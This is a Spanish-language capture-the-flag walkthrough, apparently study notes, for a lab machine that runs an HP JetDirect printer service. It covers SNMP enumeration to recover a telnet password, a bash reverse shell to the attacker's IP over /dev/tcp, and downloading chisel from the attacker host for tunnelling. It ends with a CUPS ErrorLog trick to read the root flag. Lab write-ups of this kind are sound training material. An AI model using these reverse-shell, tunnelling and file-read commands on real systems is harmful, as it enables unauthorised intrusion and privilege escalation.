***
IP máquina -> 10.129.65.15
IP atacante -> 10.10.17.184
# 1. Reconocimiento

Realizamos un escaneo a la máquina vulnerable para ver posibles puertos abiertos

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -Pn -n 10.129.65.15 -oN allPorts
```

Solo encontramos abierto el puerto 23, por lo que aplicamos un escaneo (estándar) para encontrar información sobre este

```bash
nmap -sCV 10.129.65.15 -oN targeted
```

Dejamos que cargue y nos conectamos por telnet (23) hacia la máquina

```bash
telnet 10.129.65.15 23
```

Esto nos dará un aviso de que la máquina es un HP JetDirect (servidor para conectar impresoras) y nos pedirá una contraseña la cual no tenemos. Respecto al escaneo anterior, no no devuelve información importante.

En estos casos, lo mejor es hacer un escaneo por UDP. De la siguiente forma:

```bash
nmap -sU --top-ports 100 --open -T5 -v -n 10.129.65.15
```

![[eJPTv2/imgs/udp_scan_antique.png|800]]

Y como podemos ver, nos devuelve que el puerto 161 está abierto, el cual usa el servicio `snmp`.

### Herramientas útiles:

**snmpwak**: Utiliza solicitudes SNMP GETNEXT para consultar un entidad de red y recuperar un árbol completo de valores | Recopilación de datos | Se le tiene que pasar una serie de parámetros como la COMMUNITY STRING (la cual normalmente suele ser **PUBLIC**), sobre la cual se puede hacer fuerza bruta usando un diccionario de seclists

```bash
snmpwalk -c public -v2c 10.129.65.15
# -c -> community string
# -v2c -> versión
```

Funciona como una estructura de árbol y por defecto tira de la OID 2, no desde la raíz, o sea que si agregamos un 2 al final, sigue siendo lo mismo, pero si especifícas 1, será desde la raíz.

**onesixtyone**: Fuerza bruta sobre la community string de snmp

```bash
onesixtyone 10.129.65.15 -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt
```

``Path dict: /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt``

Al hacer utilizar snmpwalk, nos devuelve:

![[eJPTv2/imgs/snmapwalk_antique.png]]

Si queremos ver un nombre más detallado y descriptivo, podemos cambiar el mibs para que no nos represente `iso.3.6.1.2.1`

Se hace de la siguiente forma:

 1. Instalamos `snmp-mibs-downloader`
 2. Abrimos el `/etc/snmp/snmp.conf`
 3. Comentamos la línea que pone `mibs`

Como explicamos más arriba, tiramos el comando desde la OID raíz (es decir 1):

```bash
snmpwalk -c public 10.129.65.15 1
```

![[eJPTv2/imgs/snmpwalk_raiz.png]]

Y esto nos devuelve una cadena en hexadecimal, la cual descriframos con el siguiente comando:

```bash
echo "<cadena>" | xargs # Para quitar saltos de línea
echo "<cadena>" | xargs | xxd -ps -r #process:ps #reverse:r # Proceso inverso para ver la cadena en texto plano (Hexadecimal -> Texto plano)
```

Y tenemos la contraseña que podemos probar para conectarnos al servicio telnet

`P@ssw0rd@123!!123q"2Rbs3CSs$4EuWGW(8i`

![[eJPTv2/imgs/telnet_pass_antique.png]]


## 2. Escalada de privilegios

Con un signo de interrogación podemos ver que nos lista una serie de parámetros, en la cual nos pone `exec` que es para ejecutar comandos.

De esta forma, podemos ver el id, uid, whoami, revisar directorios, etc

![[eJPTv2/imgs/exec_antique_flag_user.png]]

Lanzamos una shell a nuestro puerto 443 

1. Nos ponemos en escucha

```bash
nc -nlvp 443
```

2. Mandamos la shell desde la máquina víctima

```bash
bash -c "bash -i >& /dev/tcp/10.10.17.184/443 0>&1"
```

Y así obtenemos la shell

![[eJPTv2/imgs/shell_antique.png]]

Aplicamos un tratamiento de tty

```bash
script /dev/null -c bash
# Presionamos ctrl + z
stty raw -echo; fg
reset xterm
export TERM=xterm
stty rows 44 columns 184
```

Ya dentro aplicamos paso a paso el análisis para elegir una ruta por la cual escalar privilegios

```bash
#1. Buscar archivos con permiso SUID
find /-perm -4000 2>/dev/null

#2. Buscar capabilities
getcap -r / 2>/dev/null

#3. Puertos abiertos
netstat -nat
```

Con netstat podemos ver un puerto 631 que antes no habiamos visto, por lo que usaremos la herramienta chisel https://github.com/jpillora/chisel para mostrarlo. Debemos compilarlo porque está programado en go.

# Para ver una web en nuestro equipo local

En la máquina host:
```bash
cd chisel # nos movemos al rep chisel
go build -ldflags "-s -w" . # flags para reducir el peso
file chisel # crear compilado del binario chisel
upx chisel # reducir más el peso
```

Este archivo final lo transferimos a la máquina victima mediante un servicio http con Python

```bash
python3 -m http.server 80
```

En la máquina víctima descargamos dicho archivo

```bash
wget http://10.10.17.184/chisel
chmod +x chisel
```

La máquina host debe actuar ahora como un servidor y la víctima como un cliente

Host:
```bash
./chisel server --reverse -p 1234
```

Victima:
```bash
./chisel client 10.10.14.29:1234
```

En la máquina host ya podriamos ingresar al pueto 631 (es el localhost de la máquina víctima)

### 2.1 Exploits

Lo que vemos es una página del servicio cups, del cual se pueden buscar exploit con `searchsploit`

```bash
searchsploit cups
```

Buscamos un exploit de cups en repos de github y damos con uno que consiste en modificar la variable ERROR_LOG para que nos muestre archivos, en nuestro caso queremos ver la flag del root

```bash
cupsctl ErrorLog=/root/root.txt

curl -s -X GET "https://localhost:631/admin/error_log"
```

![[eJPTv2/imgs/errorlog_antique.png]]

Esto nos mostraría la flag
También podemos usar el exploit DirtyPipe para que nos mande una consola en root, pero antes hay que compilarlo porque esta programado en C, lo ejecutamos y escalamos privilegios.

